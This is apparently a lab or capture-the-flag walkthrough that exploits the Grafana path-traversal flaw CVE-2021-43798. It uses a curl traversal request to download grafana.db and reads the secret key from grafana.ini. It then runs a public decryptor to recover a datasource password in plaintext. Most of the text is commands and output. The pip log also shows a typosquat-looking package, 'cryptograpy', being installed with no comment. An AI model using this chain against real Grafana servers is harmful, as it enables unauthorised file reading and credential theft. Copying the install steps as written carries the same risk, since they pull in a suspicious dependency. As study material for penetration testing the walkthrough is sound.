
# Manual Exploitation

---

Assuming we have LFI, we can save the database file locally and explore it to gain credentials.

## Database File

Absolute path to database file.

```
/var/lib/grafana/grafana.db
```

## Config File

Absolute path to config file, in which credentials & secret key are usually stored.

```
/etc/grafana/grafana.ini
```

## PoC

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  748k  100  748k    0     0  1364k      0 --:--:-- --:--:-- --:--:-- 1362k
```

Navigate top left in kali linux > open sqllitebrowser > Select .db file > Find Table with column u want to inspect > Press "Browse Data" > Retrieve Credentials 

We got an encoded grafana password now.

Searched up for grafana password decrypters and utilized the following

```
git clone https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798.git
```

The decrypter comes with requirements, which we will have to download. In order to do so, we will have to create an virtual environment.

```
python3 venv myenv
source myenv/bin/activate
```

Download requirements.

```
pip install -r requirements.txt
Downloading questionary-2.1.1-py3-none-any.whl.metadata (5.4 kB)
Collecting requests (from -r requirements.txt (line 2))
  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
Collecting cryptograpy (from -r requirements.txt (line 3))
  Downloading cryptograpy-0.0.0-py2.py3-none-any.whl.metadata (290 bytes)
Collecting termcolor (from -r requirements.txt (line 4))
  Downloading termcolor-3.2.0-py3-none-any.whl.metadata (6.4 kB)
Collecting prompt_toolkit<4.0,>=2.0 (from questionary->-r requirements.txt (line 1))
  Downloading prompt_toolkit-3.0.52-py3-none-any.whl.metadata (6.4 kB)
Collecting wcwidth (from prompt_toolkit<4.0,>=2.0->questionary->-r requirements.txt (line 1))
  Downloading wcwidth-0.2.14-py2.py3-none-any.whl.metadata (15 kB)
Collecting charset_normalizer<4,>=2 (from requests->-r requirements.txt (line 2))
  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
Collecting idna<4,>=2.5 (from requests->-r requirements.txt (line 2))
  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
Collecting urllib3<3,>=1.21.1 (from requests->-r requirements.txt (line 2))
  Using cached urllib3-2.6.2-py3-none-any.whl.metadata (6.6 kB)
Collecting certifi>=2017.4.17 (from requests->-r requirements.txt (line 2))
  Using cached certifi-2025.11.12-py3-none-any.whl.metadata (2.5 kB)
Collecting cryptography (from cryptograpy->-r requirements.txt (line 3))
  Using cached cryptography-46.0.3-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (5.7 kB)
Collecting cffi>=2.0.0 (from cryptography->cryptograpy->-r requirements.txt (line 3))
  Using cached cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.6 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography->cryptograpy->-r requirements.txt (line 3))
  Using cached pycparser-2.23-py3-none-any.whl.metadata (993 bytes)
Downloading questionary-2.1.1-py3-none-any.whl (36 kB)
Downloading prompt_toolkit-3.0.52-py3-none-any.whl (391 kB)
Using cached requests-2.32.5-py3-none-any.whl (64 kB)
Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
Using cached idna-3.11-py3-none-any.whl (71 kB)
Using cached urllib3-2.6.2-py3-none-any.whl (131 kB)
Downloading cryptograpy-0.0.0-py2.py3-none-any.whl (1.9 kB)
Downloading termcolor-3.2.0-py3-none-any.whl (7.7 kB)
Using cached certifi-2025.11.12-py3-none-any.whl (159 kB)
Using cached cryptography-46.0.3-cp311-abi3-manylinux_2_34_x86_64.whl (4.5 MB)
Using cached cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (219 kB)
Using cached pycparser-2.23-py3-none-any.whl (118 kB)
Downloading wcwidth-0.2.14-py2.py3-none-any.whl (37 kB)
Installing collected packages: wcwidth, urllib3, termcolor, pycparser, idna, charset_normalizer, certifi, requests, prompt_toolkit, cffi, questionary, cryptography, cryptograpy
Successfully installed certifi-2025.11.12 cffi-2.0.0 charset_normalizer-3.4.4 cryptography-46.0.3 cryptograpy-0.0.0 idna-3.11 prompt_toolkit-3.0.52 pycparser-2.23 questionary-2.1.1 requests-2.32.5 termcolor-3.2.0 urllib3-2.6.2 wcwidth-0.2.14
```

Changed the secret key within the exploit the one I discovered in /etc/grafana/grafana.ini "SW2YcwTIb9zpOOhoPsMm".

Ran the exploit & cracked the password.

```
python3 decrypt.py                                           

    ######################################                                                                                                    
             GRAFANA DECRYPTOR                                                                                                                
 CVE-2021-43798 Grafana Unauthorized                                                                                                          
  arbitrary file reading vulnerability                                                                                                        
                SICARI0                                                                                                                       
    ######################################                                                                                                    
                                                                                                                                              
? Enter the datasource password: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```